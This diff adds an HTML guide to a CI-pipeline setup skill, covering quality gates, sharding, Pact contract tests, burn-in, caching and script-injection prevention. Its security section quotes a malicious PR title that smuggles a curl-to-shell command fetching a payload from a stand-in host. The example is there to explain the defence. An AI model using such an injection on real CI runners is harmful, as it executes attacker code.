+      <p>Quality gates define the rules that block a merge or deployment automatically — no human needs to decide. This step sets the thresholds and wires up failure alerts.</p>
+      <ul class="step-detail">
+        <li><strong class="label">File</strong><code>steps-c/step-03-configure-quality-gates.md</code></li>
+        <li><strong class="label">Burn-in config</strong>Frontend/Fullstack: burn-in enabled by default (UI tests are prone to flakiness). Backend: skipped by default (unit/API tests are deterministic). Can be overridden explicitly.</li>
+        <li><strong class="label">Pass rate gates</strong>P0 = 100% (any P0 failure blocks everything). P1 ≥ 95% (up to ~1–2 failures acceptable with a documented plan).</li>
+        <li><strong class="label">Contract gate</strong>If Pact is enabled: the <code>can-i-deploy</code> check must pass before any staging or production deployment. A failing contract = deployment blocked.</li>
+        <li><strong class="label">Notifications</strong>CI failure → automatic alert to Slack channel or email, with a direct link to the artifact (HTML report, video, trace) so QA can debug immediately.</li>
+      </ul>
+
+      <h4 class="step-heading">step-04 · Validate &amp; Summarize</h4>
+      <p>Before declaring the setup complete, the skill validates its own output against the checklist and fixes any gaps. It then produces a completion report telling you exactly what was created and what to do next.</p>
+      <ul class="step-detail">
+        <li><strong class="label">File</strong><code>steps-c/step-04-validate-and-summary.md</code></li>
+        <li><strong class="label">Self-validates</strong>Checks: config file at correct path · stages and sharding configured · burn-in and artifacts enabled · required secrets documented. Applies corrections before marking complete.</li>
+        <li><strong class="label">Completion report</strong>States: CI platform used · config file path · key stages enabled · artifacts and notifications set up · next steps (set secrets, push, open first PR).</li>
+      </ul>
+
+      <h3 class="skill-heading" id="steps-e">
+        <span class="code-name">steps-e</span>
+        Edit Mode — 2 Steps
+      </h3>
+      <p>Use when you need to update one part of an existing CI config — add a stage, change shard count, add a new notification channel — without regenerating everything.</p>
+      <ul class="step-detail">
+        <li><strong class="label">step-01</strong><code>steps-e/step-01-assess.md</code> — Loads the existing CI config and identifies what needs to change.</li>
+        <li><strong class="label">step-02</strong><code>steps-e/step-02-apply-edit.md</code> — Applies the change and confirms. Does not touch anything outside the requested scope.</li>
+      </ul>
+
+      <h3 class="skill-heading" id="steps-v">
+        <span class="code-name">steps-v</span>
+        Validate Mode — 1 Step
+      </h3>
+      <p>Use when you want to audit an existing CI config — whether you wrote it, inherited it, or just want to check it after a major change. Produces a PASS / WARN / FAIL report against the full checklist.</p>
+      <ul class="step-detail">
+        <li><strong class="label">step-01</strong><code>steps-v/step-01-validate.md</code> — Reads the existing CI config and evaluates every checklist item. Writes findings to <code>ci-validation-report.md</code>. Does not modify the config.</li>
+      </ul>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- Pipeline Stages -->
+    <section id="pipeline-stages">
+      <h3 class="skill-heading">
+        <span class="code-name">pipeline-stages</span>
+        Pipeline Stages — Explained
+      </h3>
+      <p>Every generated pipeline runs these stages in order. Each stage has a distinct responsibility so failures are immediately attributable.</p>
+
+      <pre>lint  →  test (4 shards in parallel)  →  contract-test*  →  burn-in*  →  report
+ &lt;2min        &lt;10min each                    optional           optional      always</pre>
+
+      <h4 class="step-heading">Stage 1 — lint</h4>
+      <p>Checks code style, formatting, and obvious mistakes before any test runs. If lint fails, the pipeline stops immediately — no point running 200 tests if a typo in a config file would have caused them all to fail anyway. Typically finishes in under 2 minutes.</p>
+
+      <h4 class="step-heading" id="sharding">Stage 2 — test (Parallel Sharding)</h4>
+      <p>Instead of running 200 tests one-by-one (which takes 30–60 min), sharding splits them across multiple runners that work simultaneously:</p>
+      <pre>Shard 1: tests 001–050  ──┐
+Shard 2: tests 051–100  ──┤→ all run at the same time → done in ~8 min
+Shard 3: tests 101–150  ──┤
+Shard 4: tests 151–200  ──┘</pre>
+      <ul class="step-detail">
+        <li><strong class="label">Default shards</strong>4. Increase to 6 or 8 if a shard exceeds 10 minutes.</li>
+        <li><strong class="label">fail-fast: false</strong>All shards complete even if one fails — you see every failure at once, not just the first one.</li>
+        <li><strong class="label">Per-shard artifacts</strong>Each shard uploads its own named artifact (e.g. <code>test-results-shard-2-of-4</code>) so you can debug the exact failing shard.</li>
+        <li><strong class="label">Stack-aware</strong>Frontend/Fullstack: Playwright with <code>--shard=1/4</code>. Backend: pytest-xdist <code>-n auto</code>, JUnit parallel forks, Go <code>-parallel</code>, etc.</li>
+      </ul>
+
+      <h4 class="step-heading" id="contract">Stage 3 — contract-test (Optional)</h4>
+      <p>Only runs when <code>tea_use_pactjs_utils: true</code> in config. This stage enforces API contracts between services — it verifies that the frontend and backend still "agree" on the API format before allowing a deploy. See Contract Testing in the §WHAT section for the full concept explanation.</p>
+      <ul class="step-detail">
+        <li><strong class="label">Consumer gate</strong>Runs the consumer contract tests N times (default 3). Fails if the generated pact JSON is not identical across runs (determinism gate) — ensures the contract is stable before publishing it.</li>
+        <li><strong class="label">Publish pacts</strong>Pushes the verified contract to Pact Broker. Only on PR and main branch pushes.</li>
+        <li><strong class="label">Provider verify</strong>Backend runs against the published contracts — confirms its API still satisfies what the frontend expects.</li>
+        <li><strong class="label">Can-I-Deploy</strong>The final gate: <code>can-i-deploy</code> checks the broker and blocks deployment if any consumer/provider pair is incompatible. Required secrets: <code>PACT_BROKER_BASE_URL</code>, <code>PACT_BROKER_TOKEN</code>.</li>
+      </ul>
+
+      <h4 class="step-heading" id="burn-in">Stage 4 — burn-in (Flaky Test Detection)</h4>
+      <p>A <strong>flaky test</strong> is one that sometimes passes and sometimes fails for no clear reason — usually caused by timing issues, race conditions, or selector instability in UI tests. Burn-in catches them by running the same tests multiple times:</p>
+      <pre>Run test A — iteration 1: PASS
+Run test A — iteration 2: PASS
+Run test A — iteration 3: FAIL  ← flaky! Blocks merge.</pre>
+      <ul class="step-detail">
+        <li><strong class="label">Frontend / Fullstack</strong>Enabled by default — UI tests are the primary source of flakiness (timing races, CSS transitions, dynamic selectors).</li>
+        <li><strong class="label">Backend only</strong>Skipped by default — unit and API tests are deterministic. Can be enabled on request.</li>
+        <li><strong class="label">Iterations</strong>10 by default. Exits immediately on the first failure (<code>|| exit 1</code>) — no need to run all 10 if iteration 3 already failed.</li>
+        <li><strong class="label">Local mirror</strong><code>scripts/burn-in.sh</code> lets you run the same loop before pushing — catch flakiness on your machine before CI does.</li>
+      </ul>
+
+      <h4 class="step-heading">Stage 5 — report</h4>
+      <p>Aggregates results from all shards and publishes a single summary. Artifacts are uploaded <strong>only on failure</strong> — no noise on green runs, but everything you need when something breaks:</p>
+      <ul class="step-detail">
+        <li><strong class="label">Frontend artifacts</strong>HTML report (visual) · JUnit XML (machine-readable) · Playwright traces · videos of failing tests · screenshots</li>
+        <li><strong class="label">Backend artifacts</strong>JUnit XML · coverage reports · language-specific outputs</li>
+        <li><strong class="label">Retention</strong>30 days. Adjust based on how long your team needs to investigate failures.</li>
+        <li><strong class="label">No sensitive data</strong>The checklist verifies no credentials or PII are captured in artifacts before enabling.</li>
+      </ul>
+
+      <h4 class="step-heading" id="caching">Dependency Caching</h4>
+      <p>Installing packages from scratch on every CI run wastes 2–5 minutes per run. The generated pipeline caches dependencies keyed to a hash of your lockfile — if the lockfile hasn't changed, packages are restored from cache instantly.</p>
+      <div class="data-callout">
+        <div class="data-head">
+          <span class="data-label">Cache Strategy by Language</span>
+          <span class="data-source">step-01 env context · step-02</span>
+        </div>
+        <table>
+          <thead>
+            <tr><th>Language</th><th>What is cached</th><th>Cache key (hash of)</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="key-col">Node.js</td><td><code>node_modules</code> + Playwright browsers</td><td><code>package-lock.json</code></td></tr>
+            <tr><td class="key-col">Python</td><td><code>.venv</code> / pip cache</td><td><code>requirements.txt</code> / <code>pyproject.toml</code></td></tr>
+            <tr><td class="key-col">Java</td><td><code>~/.m2/repository</code> or <code>~/.gradle/caches</code></td><td><code>pom.xml</code> / <code>build.gradle</code></td></tr>
+            <tr><td class="key-col">Go</td><td>Go module cache (<code>~/go/pkg/mod</code>)</td><td><code>go.sum</code></td></tr>
+            <tr><td class="key-col">C# / .NET</td><td>NuGet packages (<code>~/.nuget/packages</code>)</td><td><code>*.csproj</code></td></tr>
+            <tr><td class="key-col">Ruby</td><td><code>vendor/bundle</code></td><td><code>Gemfile.lock</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- Quality Gates -->
+    <section id="quality-gates">
+      <h3 class="skill-heading">
+        <span class="code-name">quality-gates</span>
+        Quality Gates — Automatic Blockers
+      </h3>
+      <p>A <strong>quality gate</strong> is an automatic rule that blocks a merge or deployment if a threshold is not met. No human needs to review and decide — the gate enforces the rule every time, consistently.</p>
+      <ul class="step-detail">
+        <li><strong class="label">P0 gate</strong>Pass rate must be 100%. Any single P0 failure = CI fails, deployment blocked. No exceptions.</li>
+        <li><strong class="label">P1 gate</strong>Pass rate must be ≥ 95%. Up to ~1–2 failures acceptable, but they must have a documented remediation plan.</li>
+        <li><strong class="label">Burn-in gate</strong>If burn-in stability check fails → promotion blocked. A burn-in failure means the test is flaky — it must be fixed before merging.</li>
+        <li><strong class="label">Contract gate</strong>If Pact is enabled: <code>can-i-deploy</code> must pass before any staging or production deployment. A contract failure = deploy blocked.</li>
+        <li><strong class="label">Retry logic</strong>Transient failures (network timeout, env flakiness) get up to 2–3 automatic retries with a 30-min timeout. Deterministic failures (actual bugs) are never retried — they must be fixed.</li>
+        <li><strong class="label">Optional NFR gate</strong>Require <code>bmad-testarch-nfr</code> assessment output before the release gate if configured — enforces that NFR evidence exists before shipping.</li>
+      </ul>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- Security -->
+    <section id="security">
+      <h3 class="skill-heading">
+        <span class="code-name">security</span>
+        Script Injection Prevention
+        <span class="code-tag">critical</span>
+      </h3>
+      <p>CI pipelines can be exploited if user-controlled values (PR titles, issue bodies, workflow inputs) are placed directly into shell commands. A malicious PR title like <code>"; curl evil.com/payload | sh"</code> could execute arbitrary code on the CI runner.</p>
+      <p>All pipelines generated by this skill follow two strict rules:</p>
+
+      <div class="security-callout">
+        <div class="sec-label">Rule 1 — Never interpolate user-controlled values directly</div>
+        <p>Treat <code>${{ inputs.* }}</code> and <code>${{ github.event.* }}</code> (PR title, issue body, comment) as unsafe. Always pass them through an <code>env:</code> variable first, then reference the variable as <code>"$ENV_VAR"</code> in shell commands.</p>
+      </div>
+
+      <div class="security-callout">
+        <div class="sec-label">Rule 2 — Inputs must be DATA, never COMMANDS</div>
+        <p>Never accept an input like <code>inputs.install-command</code> that gets executed as a shell command. Even through <code>env:</code>, running <code>$CMD</code> where CMD comes from user input is still injection. Use fixed commands and pass inputs only as data arguments.</p>
+      </div>
+
+      <div class="data-callout">
+        <div class="data-head">
+          <span class="data-label">Safe vs Unsafe — At a Glance</span>
+          <span class="data-source">step-02 security section</span>
+        </div>
+        <table>
+          <thead>
+            <tr><th>Pattern</th><th>Status</th><th>Why</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>env: TEST_GREP: ${{ inputs.test-grep }}</code><br>then <code>run: npx playwright test --grep "$TEST_GREP"</code></td>
+              <td style="color:#166534;font-weight:700;">SAFE</td>
+              <td>Input is passed through env: as a data argument to a fixed command</td>
+            </tr>
+            <tr>
+              <td><code>run: npx playwright test --grep "${{ inputs.test-grep }}"</code></td>
+              <td style="color:#991b1b;font-weight:700;">NEVER</td>
+              <td>User input injected directly into a shell run: block</td>
+            </tr>
+            <tr>
+              <td><code>env: CMD: ${{ inputs.install-command }}</code><br>then <code>run: $CMD</code></td>
+              <td style="color:#991b1b;font-weight:700;">NEVER</td>
+              <td>Executing a user-controlled env var as a shell command — still injection</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h5>Contexts that are always safe (no env: intermediary needed)</h5>
+      <p><code>${{ steps.*.outputs.* }}</code> · <code>${{ matrix.* }}</code> · <code>${{ runner.os }}</code> · <code>${{ github.sha }}</code> · <code>${{ github.ref }}</code> · <code>${{ secrets.* }}</code> · <code>${{ env.* }}</code></p>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- Performance Targets -->
+    <section id="performance">
+      <h3 class="skill-heading">
+        <span class="code-name">performance</span>
+        Performance Targets
+      </h3>
+      <p class="lede">The generated pipeline is validated against these timing thresholds. If a stage runs over, adjust the shard count rather than removing tests.</p>
+
+      <div class="perf-grid">
+        <div class="perf-card">
+          <div class="perf-label">Lint stage</div>
+          <div class="perf-value">&lt; 2</div>
+          <div class="perf-desc">minutes</div>
+        </div>
+        <div class="perf-card">
+          <div class="perf-label">Test per shard</div>
+          <div class="perf-value">&lt; 10</div>
+          <div class="perf-desc">minutes</div>
+        </div>
+        <div class="perf-card">
+          <div class="perf-label">Burn-in stage</div>
+          <div class="perf-value">&lt; 30</div>
+          <div class="perf-desc">minutes</div>
+        </div>
+        <div class="perf-card">
+          <div class="perf-label">Total pipeline</div>
+          <div class="perf-value">&lt; 45</div>
+          <div class="perf-desc">minutes</div>
+        </div>
+      </div>
+
+      <ul class="inline-list">
+        <li>Cache reduces install time by 2–5 min per run — check the logs after the first run to confirm cache hits are working.</li>
+        <li>If a test shard exceeds 10 min → increase shard count (4 → 6 → 8). Never solve this by removing tests.</li>
+        <li>Burn-in too slow → reduce iterations or move to a scheduled cron job instead of every PR.</li>
+        <li>Total pipeline over 45 min → profile which stage is the bottleneck, then address that stage specifically.</li>
+      </ul>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- Checklist -->
+    <section id="checklist">
+      <h3 class="skill-heading">
+        <span class="code-name">checklist</span>
+        Key Checklist Items
+      </h3>
+      <p>Step-04 validates the generated config against these items before marking setup complete. Use Validate mode anytime to re-run this check.</p>
+
+      <h5>Prerequisites</h5>
+      <ul class="checklist">
+        <li>Git repository initialized and remote configured</li>
+        <li>Test framework set up and config file exists for detected stack</li>
+        <li>Local tests pass before CI setup begins</li>
+        <li>Team agreed on CI platform</li>
+      </ul>
+
+      <h5>CI Config Correctness</h5>
+      <ul class="checklist">
+        <li>CI config file at platform-correct path (see Platform table above)</li>
+        <li>YAML / Groovy syntax is valid — no parse errors</li>
+        <li>Correct test commands for detected stack and framework</li>
+        <li>Language version matches what the project uses locally</li>
+        <li>Browser install step included for Frontend/Fullstack; omitted for Backend</li>
+        <li>Parallel sharding configured (4 shards default, <code>fail-fast: false</code>)</li>
+      </ul>
+
+      <h5>Burn-In &amp; Artifacts</h5>
+      <ul class="checklist">
+        <li>Burn-in job present for Frontend/Fullstack OR explicitly documented as skipped for Backend</li>
+        <li>Burn-in: 10 iterations, exits on first failure (<code>|| exit 1</code>)</li>
+        <li>Artifacts uploaded on failure only (not on every run)</li>
+        <li>Retention days set (30-day default)</li>
+        <li>Artifact names unique per shard to avoid collisions</li>
+        <li>No credentials or PII captured in artifacts</li>
+      </ul>
+
+      <h5>Security</h5>
+      <ul class="checklist">
+        <li>No secrets or credentials hardcoded in CI config files</li>
+        <li>All <code>${{ inputs.* }}</code> and user-controlled event contexts routed through <code>env:</code> intermediaries</li>
+        <li>No command-shaped inputs that get executed as shell code</li>
+        <li>All <code>run:</code> blocks use fixed commands — inputs are data arguments only</li>
+      </ul>
+
+      <h5>Documentation</h5>
+      <ul class="checklist">
+        <li><code>docs/ci.md</code> created with pipeline guide and troubleshooting notes</li>
+        <li><code>docs/ci-secrets-checklist.md</code> lists all required secrets with platform-specific setup instructions</li>
+        <li>All <code>.sh</code> scripts have a shebang line and are executable (<code>chmod +x</code>)</li>
+      </ul>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- Post-Setup Actions -->
+    <section id="post">
+      <h3 class="skill-heading">
+        <span class="code-name">post-setup</span>
+        After the Skill Completes — What to Do Next
+      </h3>
+
+      <h4 class="step-heading">Actions required from you</h4>
+      <ul class="step-detail">
+        <li><strong class="label">1. Set secrets</strong>Go to your CI platform's secret management UI and add the required secrets. Refer to <code>docs/ci-secrets-checklist.md</code> — it lists every secret and exactly where to enter it for each platform.</li>
+        <li><strong class="label">2. Commit &amp; push</strong>Commit all generated files (CI config, scripts, docs) in one commit and push to remote. This triggers the first CI run.</li>
+        <li><strong class="label">3. Open a PR</strong>Open a test PR to trigger the full pipeline. Watch all stages appear in the CI dashboard — lint, test shards, burn-in, report.</li>
+        <li><strong class="label">4. Verify cache</strong>Check the logs after the first run — confirm cache hits are working. This is the 2–5 min install time saving per run.</li>
+        <li><strong class="label">5. Tune shards</strong>Check per-shard run time. If a shard exceeds 10 min, increase shard count. Goal: every shard under 10 min.</li>
+        <li><strong class="label">6. Set up notifications</strong>Configure Slack or email failure notifications if not auto-configured. Refer to the platform-specific setup below.</li>
+      </ul>
+
+      <h4 class="step-heading">Where to configure secrets per platform</h4>
+      <div class="data-callout">
+        <div class="data-head">
+          <span class="data-label">Secret Configuration Location</span>
+          <span class="data-source">checklist.md · Platform notes</span>
+        </div>
+        <table>
+          <thead>
+            <tr><th>Platform</th><th>Where to add secrets</th><th>Notes</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="key-col">GitHub Actions</td><td>Repository Settings → Secrets and variables → Actions</td><td>20 parallel jobs on free tier</td></tr>
+            <tr><td class="key-col">GitLab CI</td><td>Project Settings → CI/CD → Variables</td><td>400 min/month on free tier</td></tr>
+            <tr><td class="key-col">Jenkins</td><td>Manage Jenkins → Manage Credentials</td><td>Configure build agents with your language version</td></tr>
+            <tr><td class="key-col">Azure DevOps</td><td>Pipelines → Library → Variable groups</td><td>1 parallel job free on Microsoft-hosted agents</td></tr>
+            <tr><td class="key-col">Harness</td><td>Connectors + Harness delegate in target infra</td><td>Requires container registry connector</td></tr>
+            <tr><td class="key-col">Circle CI</td><td>Project Settings → Environment Variables</td><td>—</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+    </section>
+
+  </main>
+
+</div>
+
+</body>
+</html>
